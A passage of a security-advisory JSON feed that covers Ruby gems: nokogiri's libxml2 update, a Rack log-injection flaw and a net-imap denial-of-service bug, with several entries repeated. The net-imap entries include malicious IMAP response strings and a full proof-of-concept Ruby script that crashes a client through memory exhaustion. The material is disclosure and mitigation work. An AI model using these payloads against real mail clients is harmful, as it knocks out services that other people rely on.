href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/nokogiri/GHSA-vvfq-8hwr-qm4m.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/nokogiri/GHSA-vvfq-8hwr-qm4m.yml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5mwf-688x-mr7x\">https://github.com/advisories/GHSA-5mwf-688x-mr7x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5mwf-688x-mr7x",
            "title": "[nokogiri] Nokogiri updates packaged libxml2 to 2.13.6 to resolve CVE-2025-24928 and CVE-2024-56171",
            "date_modified": "2025-02-19T22:17:20.000Z",
            "date_published": "2025-02-19T22:17:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5mwf-688x-mr7x"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>Nokogiri v1.18.3 upgrades its dependency libxml2 to <a href=\"https://gitlab.gnome.org/GNOME/libxml2/-/releases/v2.13.6\">v2.13.6</a>.</p>\n<p>libxml2 v2.13.6 addresses:</p>\n<ul>\n<li>CVE-2025-24928<ul>\n<li>described at <a href=\"https://gitlab.gnome.org/GNOME/libxml2/-/issues/847\">https://gitlab.gnome.org/GNOME/libxml2/-/issues/847</a></li>\n</ul>\n</li>\n<li>CVE-2024-56171<ul>\n<li>described at <a href=\"https://gitlab.gnome.org/GNOME/libxml2/-/issues/828\">https://gitlab.gnome.org/GNOME/libxml2/-/issues/828</a></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"impact\">Impact</h2>\n<h3 id=\"cve-2025-24928\">CVE-2025-24928</h3>\n<p>Stack-buffer overflow is possible when reporting DTD validation errors if the input contains a long (~3kb) QName prefix.</p>\n<h3 id=\"cve-2024-56171\">CVE-2024-56171</h3>\n<p>Use-after-free is possible during validation against untrusted XML Schemas (.xsd) and, potentially, validation of untrusted documents against trusted Schemas if they make use of <code>xsd:keyref</code> in combination with recursively defined types that have additional identity constraints.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/sparklemotion/nokogiri/security/advisories/GHSA-vvfq-8hwr-qm4m\">https://github.com/sparklemotion/nokogiri/security/advisories/GHSA-vvfq-8hwr-qm4m</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vvfq-8hwr-qm4m\">https://github.com/advisories/GHSA-vvfq-8hwr-qm4m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vvfq-8hwr-qm4m",
            "title": "[nokogiri] Nokogiri updates packaged libxml2 to 2.13.6 to resolve CVE-2025-24928 and CVE-2024-56171",
            "date_modified": "2025-02-18T22:36:04.000Z",
            "date_published": "2025-02-18T22:36:03.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vvfq-8hwr-qm4m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p><code>Rack::CommonLogger</code> can be exploited by crafting input that includes newline characters to manipulate log entries. The supplied proof-of-concept demonstrates injecting malicious content into logs.</p>\n<h2 id=\"details\">Details</h2>\n<p>When a user provides the authorization credentials via <code>Rack::Auth::Basic</code>, if success, the username will be put in <code>env['REMOTE_USER']</code> and later be used by <code>Rack::CommonLogger</code> for logging purposes.</p>\n<p>The issue occurs when a server intentionally or unintentionally allows a user creation with the username contain CRLF and white space characters, or the server just want to log every login attempts. If an attacker enters a username with CRLF character, the logger will log the malicious username with CRLF characters into the logfile.</p>\n<h2 id=\"impact\">Impact</h2>\n<p>Attackers can break log formats or insert fraudulent entries, potentially obscuring real activity or injecting malicious data into log files.</p>\n<h2 id=\"mitigation\">Mitigation</h2>\n<ul>\n<li>Update to the latest version of Rack.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/rack/rack/security/advisories/GHSA-7g2v-jj9q-g3rg\">https://github.com/rack/rack/security/advisories/GHSA-7g2v-jj9q-g3rg</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-25184\">https://nvd.nist.gov/vuln/detail/CVE-2025-25184</a></li>\n<li><a href=\"https://github.com/rack/rack/commit/074ae244430cda05c27ca91cda699709cfb3ad8e\">https://github.com/rack/rack/commit/074ae244430cda05c27ca91cda699709cfb3ad8e</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rack/CVE-2025-25184.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rack/CVE-2025-25184.yml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7g2v-jj9q-g3rg\">https://github.com/advisories/GHSA-7g2v-jj9q-g3rg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7g2v-jj9q-g3rg",
            "title": "[rack] Possible Log Injection in Rack::CommonLogger",
            "date_modified": "2025-02-18T15:04:50.000Z",
            "date_published": "2025-02-12T19:18:35.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7g2v-jj9q-g3rg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p><code>Rack::CommonLogger</code> can be exploited by crafting input that includes newline characters to manipulate log entries. The supplied proof-of-concept demonstrates injecting malicious content into logs.</p>\n<h2 id=\"details\">Details</h2>\n<p>When a user provides the authorization credentials via <code>Rack::Auth::Basic</code>, if success, the username will be put in <code>env['REMOTE_USER']</code> and later be used by <code>Rack::CommonLogger</code> for logging purposes.</p>\n<p>The issue occurs when a server intentionally or unintentionally allows a user creation with the username contain CRLF and white space characters, or the server just want to log every login attempts. If an attacker enters a username with CRLF character, the logger will log the malicious username with CRLF characters into the logfile.</p>\n<h2 id=\"impact\">Impact</h2>\n<p>Attackers can break log formats or insert fraudulent entries, potentially obscuring real activity or injecting malicious data into log files.</p>\n<h2 id=\"mitigation\">Mitigation</h2>\n<ul>\n<li>Update to the latest version of Rack.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/rack/rack/security/advisories/GHSA-7g2v-jj9q-g3rg\">https://github.com/rack/rack/security/advisories/GHSA-7g2v-jj9q-g3rg</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-25184\">https://nvd.nist.gov/vuln/detail/CVE-2025-25184</a></li>\n<li><a href=\"https://github.com/rack/rack/commit/074ae244430cda05c27ca91cda699709cfb3ad8e\">https://github.com/rack/rack/commit/074ae244430cda05c27ca91cda699709cfb3ad8e</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rack/CVE-2025-25184.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rack/CVE-2025-25184.yml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7g2v-jj9q-g3rg\">https://github.com/advisories/GHSA-7g2v-jj9q-g3rg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7g2v-jj9q-g3rg",
            "title": "[rack] Possible Log Injection in Rack::CommonLogger",
            "date_modified": "2025-02-18T15:04:50.000Z",
            "date_published": "2025-02-12T19:18:35.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7g2v-jj9q-g3rg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p><code>Rack::CommonLogger</code> can be exploited by crafting input that includes newline characters to manipulate log entries. The supplied proof-of-concept demonstrates injecting malicious content into logs.</p>\n<h2 id=\"details\">Details</h2>\n<p>When a user provides the authorization credentials via <code>Rack::Auth::Basic</code>, if success, the username will be put in <code>env['REMOTE_USER']</code> and later be used by <code>Rack::CommonLogger</code> for logging purposes.</p>\n<p>The issue occurs when a server intentionally or unintentionally allows a user creation with the username contain CRLF and white space characters, or the server just want to log every login attempts. If an attacker enters a username with CRLF character, the logger will log the malicious username with CRLF characters into the logfile.</p>\n<h2 id=\"impact\">Impact</h2>\n<p>Attackers can break log formats or insert fraudulent entries, potentially obscuring real activity or injecting malicious data into log files.</p>\n<h2 id=\"mitigation\">Mitigation</h2>\n<ul>\n<li>Update to the latest version of Rack.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/rack/rack/security/advisories/GHSA-7g2v-jj9q-g3rg\">https://github.com/rack/rack/security/advisories/GHSA-7g2v-jj9q-g3rg</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-25184\">https://nvd.nist.gov/vuln/detail/CVE-2025-25184</a></li>\n<li><a href=\"https://github.com/rack/rack/commit/074ae244430cda05c27ca91cda699709cfb3ad8e\">https://github.com/rack/rack/commit/074ae244430cda05c27ca91cda699709cfb3ad8e</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rack/CVE-2025-25184.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rack/CVE-2025-25184.yml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7g2v-jj9q-g3rg\">https://github.com/advisories/GHSA-7g2v-jj9q-g3rg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7g2v-jj9q-g3rg",
            "title": "[rack] Possible Log Injection in Rack::CommonLogger",
            "date_modified": "2025-02-18T15:04:50.000Z",
            "date_published": "2025-02-12T19:18:35.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7g2v-jj9q-g3rg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>There is a possibility for denial of service by memory exhaustion in <code>net-imap</code>'s response parser.  At any time while the client is connected, a malicious server can send  can send highly compressed <code>uid-set</code> data which is automatically read by the client's receiver thread.  The response parser uses <code>Range#to_a</code> to convert the <code>uid-set</code> data into arrays of integers, with no limitation on the expanded size of the ranges.</p>\n<h3 id=\"details\">Details</h3>\n<p>IMAP's <code>uid-set</code> and <code>sequence-set</code> formats can compress ranges of numbers, for example: <code>\"1,2,3,4,5\"</code> and <code>\"1:5\"</code> both represent the same set.  When <code>Net::IMAP::ResponseParser</code> receives <code>APPENDUID</code> or <code>COPYUID</code> response codes, it expands each <code>uid-set</code> into an array of integers.  On a 64 bit system, these arrays will expand to 8 bytes for each number in the set.  A malicious IMAP server may send specially crafted <code>APPENDUID</code> or <code>COPYUID</code> responses with very large <code>uid-set</code> ranges.</p>\n<p>The <code>Net::IMAP</code> client parses each server response in a separate thread, as soon as each responses is received from the server.  This attack works even when the client does not handle the <code>APPENDUID</code> or <code>COPYUID</code> responses.</p>\n<p>Malicious inputs:</p>\n<pre><code class=\"language-ruby\"># 40 bytes expands to ~1.6GB:\n\"* OK [COPYUID 1 1:99999999 1:99999999]\\r\\n\"\n\n# Worst *valid* input scenario (using uint32 max),\n# 44 bytes expands to 64GiB:\n\"* OK [COPYUID 1 1:4294967295 1:4294967295]\\r\\n\"\n\n# Numbers must be non-zero uint32, but this isn't validated.  Arrays larger than\n# UINT32_MAX can be created.  For example, the following would theoretically\n# expand to almost 800 exabytes:\n\"* OK [COPYUID 1 1:99999999999999999999 1:99999999999999999999]\\r\\n\"\n</code></pre>\n<p>Simple way to test this:</p>\n<pre><code class=\"language-ruby\">require \"net/imap\"\n\ndef test(size)\n  input = \"A004 OK [COPYUID 1 1:#{size} 1:#{size}] too large?\\r\\n\"\n  parser = Net::IMAP::ResponseParser.new\n  parser.parse input\nend\n\ntest(99_999_999)\n</code></pre>\n<h3 id=\"fixes\">Fixes</h3>\n<h4 id=\"preferred-fix-minor-api-changes\">Preferred Fix, minor API changes</h4>\n<p>Upgrade to v0.4.19, v0.5.6, or higher, and configure:</p>\n<pre><code class=\"language-ruby\"># globally\nNet::IMAP.config.parser_use_deprecated_uidplus_data = false\n# per-client\nimap = Net::IMAP.new(hostname, ssl: true,\n                               parser_use_deprecated_uidplus_data: false)\nimap.config.parser_use_deprecated_uidplus_data = false\n</code></pre>\n<p>This replaces <code>UIDPlusData</code> with <code>AppendUIDData</code> and <code>CopyUIDData</code>.  These classes store their UIDs as <code>Net::IMAP::SequenceSet</code> objects (<em>not</em> expanded into arrays of integers).  Code that does not handle <code>APPENDUID</code> or <code>COPYUID</code> responses will not notice any difference.  Code that does handle these responses <em>may</em> need to be updated.  See the documentation for <a href=\"https://ruby.github.io/net-imap/Net/IMAP/UIDPlusData.html\">UIDPlusData</a>, <a href=\"https://ruby.github.io/net-imap/Net/IMAP/AppendUIDData.html\">AppendUIDData</a> and <a href=\"https://ruby.github.io/net-imap/Net/IMAP/CopyUIDData.html\">CopyUIDData</a>.</p>\n<p>For v0.3.8, this option is not available.\nFor v0.4.19, the default value is <code>true</code>.\nFor v0.5.6, the default value is <code>:up_to_max_size</code>.\nFor v0.6.0, the only allowed value will be <code>false</code>  <em>(<code>UIDPlusData</code> will be removed from v0.6)</em>.</p>\n<h4 id=\"mitigation-backward-compatible-api\">Mitigation, backward compatible API</h4>\n<p>Upgrade to v0.3.8, v0.4.19, v0.5.6, or higher.</p>\n<p>For backward compatibility, <code>uid-set</code> can still be expanded into an array, but a maximum limit will be applied.</p>\n<p>Assign <code>config.parser_max_deprecated_uidplus_data_size</code> to set the maximum <code>UIDPlusData</code> UID set size.\nWhen <code>config.parser_use_deprecated_uidplus_data == true</code>, larger sets will raise <code>Net::IMAP::ResponseParseError</code>.\nWhen  <code>config.parser_use_deprecated_uidplus_data == :up_to_max_size</code>, larger sets will use <code>AppendUIDData</code> or <code>CopyUIDData</code>.</p>\n<p>For v0.3,8, this limit is <em>hard-coded</em> to 10,000, and larger sets will always raise <code>Net::IMAP::ResponseParseError</code>.\nFor v0.4.19, the limit defaults to 1000.\nFor v0.5.6, the limit defaults to 100.\nFor v0.6.0, the limit will be ignored  <em>(<code>UIDPlusData</code> will be removed from v0.6)</em>.</p>\n<h4 id=\"please-note-unhandled-responses\">Please Note: unhandled responses</h4>\n<p>If the client does not add response handlers to prune unhandled responses, a malicious server can still eventually exhaust all client memory, by repeatedly sending malicious responses.  However, <code>net-imap</code> has always retained unhandled responses, and it has always been necessary for long-lived connections to prune these responses.  <em>This is not significantly different from connecting to a trusted server with a long-lived connection.</em>  To limit the maximum number of retained responses, a simple handler might look something like the following:</p>\n<pre><code class=\"language-ruby\">limit = 1000\nimap.add_response_handler do |resp|\n  next unless resp.respond_to?(:name) &amp;&amp; resp.respond_to?(:data)\n  name = resp.name\n  code = resp.data.code&amp;.name if resp.data.respond_to?(:code)\n  if Net::IMAP::VERSION &gt; \"0.4.0\"\n    imap.responses(name) { _1.slice!(0...-limit) }\n    imap.responses(code) { _1.slice!(0...-limit) }\n  else\n    imap.responses(name).slice!(0...-limit)\n    imap.responses(code).slice!(0...-limit)\n  end\nend\n</code></pre>\n<h3 id=\"proof-of-concept\">Proof of concept</h3>\n<p>Save the following to a ruby file (e.g: <code>poc.rb</code>) and make it executable:</p>\n<pre><code class=\"language-ruby\">#!/usr/bin/env ruby\nrequire 'socket'\nrequire 'net/imap'\n\nif !defined?(Net::IMAP.config)\n  puts \"Net::IMAP.config is not available\"\nelsif !Net::IMAP.config.respond_to?(:parser_use_deprecated_uidplus_data)\n  puts \"Net::IMAP.config.parser_use_deprecated_uidplus_data is not available\"\nelse\n  Net::IMAP.config.parser_use_deprecated_uidplus_data = :up_to_max_size\n  puts \"Updated parser_use_deprecated_uidplus_data to :up_to_max_size\"\nend\n\nsize = Integer(ENV[\"UID_SET_SIZE\"] || 2**32-1)\n\ndef server_addr\n  Addrinfo.tcp(\"localhost\", 0).ip_address\nend\n\ndef create_tcp_server\n  TCPServer.new(server_addr, 0)\nend\n\ndef start_server\n  th = Thread.new do\n    yield\n  end\n  sleep 0.1 until th.stop?\nend\n\ndef copyuid_response(tag: \"*\", size: 2**32-1, text: \"too large?\")\n  \"#{tag} OK [COPYUID 1 1:#{size} 1:#{size}] #{text}\\r\\n\"\nend\n\ndef appenduid_response(tag: \"*\", size: 2**32-1, text: \"too large?\")\n  \"#{tag} OK [APPENDUID 1 1:#{size}] #{text}\\r\\n\"\nend\n\nserver = create_tcp_server\nport = server.addr[1]\nputs \"Server started on port #{port}\"\n\n# server\nstart_server do\n  sock = server.accept\n  begin\n    sock.print \"* OK test server\\r\\n\"\n    cmd = sock.gets(\"\\r\\n\", chomp: true)\n    tag = cmd.match(/\\A(\\w+) /)[1]\n    puts \"Received: #{cmd}\"\n\n    malicious_response = appenduid_response(size:)\n    puts \"Sending: #{malicious_response.chomp}\"\n    sock.print malicious_response\n\n    malicious_response = copyuid_response(size:)\n    puts \"Sending: #{malicious_response.chomp}\"\n    sock.print malicious_response\n    sock.print \"* CAPABILITY JUMBO=UIDPLUS PROOF_OF_CONCEPT\\r\\n\"\n    sock.print \"#{tag} OK CAPABILITY completed\\r\\n\"\n\n    cmd = sock.gets(\"\\r\\n\", chomp: true)\n    tag = cmd.match(/\\A(\\w+) /)[1]\n    puts \"Received: #{cmd}\"\n    sock.print \"* BYE If you made it this far, you passed the test!\\r\\n\"\n    sock.print \"#{tag} OK LOGOUT completed\\r\\n\"\n  rescue Exception =&gt; ex\n    puts \"Error in server: #{ex.message} (#{ex.class})\"\n  ensure\n    sock.close\n    server.close\n  end\nend\n\n# client\nbegin\n  puts \"Client connecting,..\"\n  imap = Net::IMAP.new(server_addr, port: port)\n  puts \"Received capabilities: #{imap.capability}\"\n  pp responses: imap.responses\n  imap.logout\nrescue Exception =&gt; ex\n  puts \"Error in client: #{ex.message} (#{ex.class})\"\n  puts ex.full_message\nensure\n  imap.disconnect if imap\nend\n</code></pre>\n<p>Use <code>ulimit</code> to limit the process's virtual memory.  The following example limits virtual memory to 1GB:</p>\n<pre><code class=\"language-console\">$ ( ulimit -v 1000000 &amp;&amp; exec ./poc.rb )\nServer started on port 34291\nClient connecting,..\nReceived: RUBY0001 CAPABILITY\nSending: * OK [APPENDUID 1 1:4294967295] too large?\nSending: * OK [COPYUID 1 1:4294967295 1:4294967295] too large?\nError in server: Connection reset by peer @ io_fillbuf - fd:9  (Errno::ECONNRESET)\nError in client: failed to allocate memory (NoMemoryError)\n/gems/net-imap-0.5.5/lib/net/imap.rb:3271:in 'Net::IMAP#get_tagged_response': failed to allocate memory (NoMemoryError)\n        from /gems/net-imap-0.5.5/lib/net/imap.rb:3371:in 'block in Net::IMAP#send_command'\n        from /rubylibdir/monitor.rb:201:in 'Monitor#synchronize'\n        from /rubylibdir/monitor.rb:201:in 'MonitorMixin#mon_synchronize'\n        from /gems/net-imap-0.5.5/lib/net/imap.rb:3353:in 'Net::IMAP#send_command'\n        from /gems/net-imap-0.5.5/lib/net/imap.rb:1128:in 'block in Net::IMAP#capability'\n        from /rubylibdir/monitor.rb:201:in 'Monitor#synchronize'\n        from /rubylibdir/monitor.rb:201:in 'MonitorMixin#mon_synchronize'\n        from /gems/net-imap-0.5.5/lib/net/imap.rb:1127:in 'Net::IMAP#capability'\n        from /workspace/poc.rb:70:in '&lt;main&gt;'\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ruby/net-imap/security/advisories/GHSA-7fc5-f82f-cx69\">https://github.com/ruby/net-imap/security/advisories/GHSA-7fc5-f82f-cx69</a></li>\n<li><a href=\"https://github.com/ruby/net-imap/commit/70e3ddd071a94e450b3238570af482c296380b35\">https://github.com/ruby/net-imap/commit/70e3ddd071a94e450b3238570af482c296380b35</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-25186\">https://nvd.nist.gov/vuln/detail/CVE-2025-25186</a></li>\n<li><a href=\"https://github.com/ruby/net-imap/commit/c8c5a643739d2669f0c9a6bb9770d0c045fd74a3\">https://github.com/ruby/net-imap/commit/c8c5a643739d2669f0c9a6bb9770d0c045fd74a3</a></li>\n<li><a href=\"https://github.com/ruby/net-imap/commit/cb92191b1ddce2d978d01b56a0883b6ecf0b1022\">https://github.com/ruby/net-imap/commit/cb92191b1ddce2d978d01b56a0883b6ecf0b1022</a></li>\n<li><a href=\"https://ruby.github.io/net-imap/Net/IMAP/AppendUIDData.html\">https://ruby.github.io/net-imap/Net/IMAP/AppendUIDData.html</a></li>\n<li><a href=\"https://ruby.github.io/net-imap/Net/IMAP/CopyUIDData.html\">https://ruby.github.io/net-imap/Net/IMAP/CopyUIDData.html</a></li>\n<li><a href=\"https://ruby.github.io/net-imap/Net/IMAP/UIDPlusData.html\">https://ruby.github.io/net-imap/Net/IMAP/UIDPlusData.html</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/net-imap/CVE-2025-25186.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/net-imap/CVE-2025-25186.yml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7fc5-f82f-cx69\">https://github.com/advisories/GHSA-7fc5-f82f-cx69</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7fc5-f82f-cx69",
            "title": "[net-imap] Possible DoS by memory exhaustion in net-imap",
            "date_modified": "2025-02-11T21:39:41.000Z",
            "date_published": "2025-02-10T17:42:43.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7fc5-f82f-cx69"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>There is a possibility for denial of service by memory exhaustion in <code>net-imap</code>'s response parser.  At any time while the client is connected, a malicious server can send  can send highly compressed <code>uid-set</code> data which is automatically read by the client's receiver thread.  The response parser uses <code>Range#to_a</code> to convert the <code>uid-set</code> data into arrays of integers, with no limitation on the expanded size of the ranges.</p>\n<h3 id=\"details\">Details</h3>\n<p>IMAP's <code>uid-set</code> and <code>sequence-set</code> formats can compress ranges of numbers, for example: <code>\"1,2,3,4,5\"</code> and <code>\"1:5\"</code> both represent the same set.  When <code>Net::IMAP::ResponseParser</code> receives <code>APPENDUID</code> or <code>COPYUID</code> response codes, it expands each <code>uid-set</code> into an array of integers.  On a 64 bit system, these arrays will expand to 8 bytes for each number in the set.  A malicious IMAP server may send specially crafted <code>APPENDUID</code> or <code>COPYUID</code> responses with very large <code>uid-set</code> ranges.</p>\n<p>The <code>Net::IMAP</code> client parses each server response in a separate thread, as soon as each responses is received from the server.  This attack works even when the client does not handle the <code>APPENDUID</code> or <code>COPYUID</code> responses.</p>\n<p>Malicious inputs:</p>\n<pre><code class=\"language-ruby\"># 40 bytes expands to ~1.6GB:\n\"* OK [COPYUID 1 1:99999999 1:99999999]\\r\\n\"\n\n# Worst *valid* input scenario (using uint32 max),\n# 44 bytes expands to 64GiB:\n\"* OK [COPYUID 1 1:4294967295 1:4294967295]\\r\\n\"\n\n# Numbers must be non-zero uint32, but this isn't validated.  Arrays larger than\n# UINT32_MAX can be created.  For example, the following would theoretically\n# expand to almost 800 exabytes:\n\"* OK [COPYUID 1 1:99999999999999999999 1:99999999999999999999]\\r\\n\"\n</code></pre>\n<p>Simple way to test this:</p>\n<pre><code class=\"language-ruby\">require \"net/imap\"\n\ndef test(size)\n  input = \"A004 OK [COPYUID 1 1:#{size} 1:#{size}] too large?\\r\\n\"\n  parser = Net::IMAP::ResponseParser.new\n  parser.parse input\nend\n\ntest(99_999_999)\n</code></pre>\n<h3 id=\"fixes\">Fixes</h3>\n<h4 id=\"preferred-fix-minor-api-changes\">Preferred Fix, minor API changes</h4>\n<p>Upgrade to v0.4.19, v0.5.6, or higher, and configure:</p>\n<pre><code class=\"language-ruby\"># globally\nNet::IMAP.config.parser_use_deprecated_uidplus_data = false\n# per-client\nimap = Net::IMAP.new(hostname, ssl: true,\n                               parser_use_deprecated_uidplus_data: false)\nimap.config.parser_use_deprecated_uidplus_data = false\n</code></pre>\n<p>This replaces <code>UIDPlusData</code> with <code>AppendUIDData</code> and <code>CopyUIDData</code>.  These classes store their UIDs as <code>Net::IMAP::SequenceSet</code> objects (<em>not</em> expanded into arrays of integers).  Code that does not handle <code>APPENDUID</code> or <code>COPYUID</code> responses will not notice any difference.  Code that does handle these responses <em>may</em> need to be updated.  See the documentation for <a href=\"https://ruby.github.io/net-imap/Net/IMAP/UIDPlusData.html\">UIDPlusData</a>, <a href=\"https://ruby.github.io/net-imap/Net/IMAP/AppendUIDData.html\">AppendUIDData</a> and <a href=\"https://ruby.github.io/net-imap/Net/IMAP/CopyUIDData.html\">CopyUIDData</a>.</p>\n<p>For v0.3.8, this option is not available.\nFor v0.4.19, the default value is <code>true</code>.\nFor v0.5.6, the default value is <code>:up_to_max_size</code>.\nFor v0.6.0, the only allowed value will be <code>false</code>  <em>(<code>UIDPlusData</code> will be removed from v0.6)</em>.</p>\n<h4 id=\"mitigation-backward-compatible-api\">Mitigation, backward compatible API</h4>\n<p>Upgrade to v0.3.8, v0.4.19, v0.5.6, or higher.</p>\n<p>For backward compatibility, <code>uid-set</code> can still be expanded into an array, but a maximum limit will be applied.</p>\n<p>Assign <code>config.parser_max_deprecated_uidplus_data_size</code> to set the maximum <code>UIDPlusData</code> UID set size.\nWhen <code>config.parser_use_deprecated_uidplus_data == true</code>, larger sets will raise <code>Net::IMAP::ResponseParseError</code>.\nWhen  <code>config.parser_use_deprecated_uidplus_data == :up_to_max_size</code>, larger sets will use <code>AppendUIDData</code> or <code>CopyUIDData</code>.</p>\n<p>For v0.3,8, this limit is <em>hard-coded</em> to 10,000, and larger sets will always raise <code>Net::IMAP::ResponseParseError</code>.\nFor v0.4.19, the limit defaults to 1000.\nFor v0.5.6, the limit defaults to 100.\nFor v0.6.0, the limit will be ignored  <em>(<code>UIDPlusData</code> will be removed from v0.6)</em>.</p>\n<h4 id=\"please-note-unhandled-responses\">Please Note: unhandled responses</h4>\n<p>If the client does not add response handlers to prune unhandled responses, a malicious server can still eventually exhaust all client memory, by repeatedly sending malicious responses.  However, <code>net-imap</code> has always retained unhandled responses, and it has always been necessary for long-lived connections to prune these responses.  <em>This is not significantly different from connecting to a trusted server with a long-lived connection.</em>  To limit the maximum number of retained responses, a simple handler might look something like the following:</p>\n<pre><code class=\"language-ruby\">limit = 1000\nimap.add_response_handler do |resp|\n  next unless resp.respond_to?(:name) &amp;&amp; resp.respond_to?(:data)\n  name = resp.name\n  code = resp.data.code&amp;.name if resp.data.respond_to?(:code)\n  if Net::IMAP::VERSION &gt; \"0.4.0\"\n    imap.responses(name) { _1.slice!(0...-limit) }\n    imap.responses(code) { _1.slice!(0...-limit) }\n  else\n    imap.responses(name).slice!(0...-limit)\n    imap.responses(code).slice!(0...-limit)\n  end\nend\n</code></pre>\n<h3 id=\"proof-of-concept\">Proof of concept</h3>\n<p>Save the following to a ruby file (e.g: <code>poc.rb</code>) and make it executable:</p>\n<pre><code class=\"language-ruby\">#!/usr/bin/env ruby\nrequire 'socket'\nrequire 'net/imap'\n\nif !defined?(Net::IMAP.config)\n  puts \"Net::IMAP.config is not available\"\nelsif !Net::IMAP.config.respond_to?(:parser_use_deprecated_uidplus_data)\n  puts \"Net::IMAP.config.parser_use_deprecated_uidplus_data is not available\"\nelse\n  Net::IMAP.config.parser_use_deprecated_uidplus_data = :up_to_max_size\n  puts \"Updated parser_use_deprecated_uidplus_data to :up_to_max_size\"\nend\n\nsize = Integer(ENV[\"UID_SET_SIZE\"] || 2**32-1)\n\ndef server_addr\n  Addrinfo.tcp(\"localhost\", 0).ip_address\nend\n\ndef create_tcp_server\n  TCPServer.new(server_addr, 0)\nend\n\ndef start_server\n  th = Thread.new do\n    yield\n  end\n  sleep 0.1 until th.stop?\nend\n\ndef copyuid_response(tag: \"*\", size: 2**32-1, text: \"too large?\")\n  \"#{tag} OK [COPYUID 1 1:#{size} 1:#{size}] #{text}\\r\\n\"\nend\n\ndef appenduid_response(tag: \"*\", size: 2**32-1, text: \"too large?\")\n  \"#{tag} OK [APPENDUID 1 1:#{size}] #{text}\\r\\n\"\nend\n\nserver = create_tcp_server\nport = server.addr[1]\nputs \"Server started on port #{port}\"\n\n# server\nstart_server do\n  sock = server.accept\n  begin\n    sock.print \"* OK test server\\r\\n\"\n    cmd = sock.gets(\"\\r\\n\", chomp: true)\n    tag = cmd.match(/\\A(\\w+) /)[1]\n    puts \"Received: #{cmd}\"\n\n    malicious_response = appenduid_response(size:)\n    puts \"Sending: #{malicious_response.chomp}\"\n    sock.print malicious_response\n\n    malicious_response = copyuid_response(size:)\n    puts \"Sending: #{malicious_response.chomp}\"\n    sock.print malicious_response\n    sock.print \"* CAPABILITY JUMBO=UIDPLUS PROOF_OF_CONCEPT\\r\\n\"\n    sock.print \"#{tag} OK CAPABILITY completed\\r\\n\"\n\n    cmd = sock.gets(\"\\r\\n\", chomp: true)\n    tag = cmd.match(/\\A(\\w+) /)[1]\n    puts \"Received: #{cmd}\"\n    sock.print \"* BYE If you made it this far, you passed the test!\\r\\n\"\n    sock.print \"#{tag} OK LOGOUT completed\\r\\n\"\n  rescue Exception =&gt; ex\n    puts \"Error in server: #{ex.message} (#{ex.class})\"\n  ensure\n    sock.close\n    server.close\n  end\nend\n\n# client\nbegin\n  puts \"Client connecting,..\"\n  imap = Net::IMAP.new(server_addr, port: port)\n  puts \"Received capabilities: #{imap.capability}\"\n  pp responses: imap.responses\n  imap.logout\nrescue Exception =&gt; ex\n  puts \"Error in client: #{ex.message} (#{ex.class})\"\n  puts ex.full_message\nensure\n  imap.disconnect if imap\nend\n</code></pre>\n<p>Use <code>ulimit</code> to limit the process's virtual memory.  The following example limits virtual memory to 1GB:</p>\n<pre><code class=\"language-console\">$ ( ulimit -v 1000000 &amp;&amp; exec ./poc.rb )\nServer started on port 34291\nClient connecting,..\nReceived: RUBY0001 CAPABILITY\nSending: * OK [APPENDUID 1 1:4294967295] too large?\nSending: * OK [COPYUID 1 1:4294967295 1:4294967295] too large?\nError in 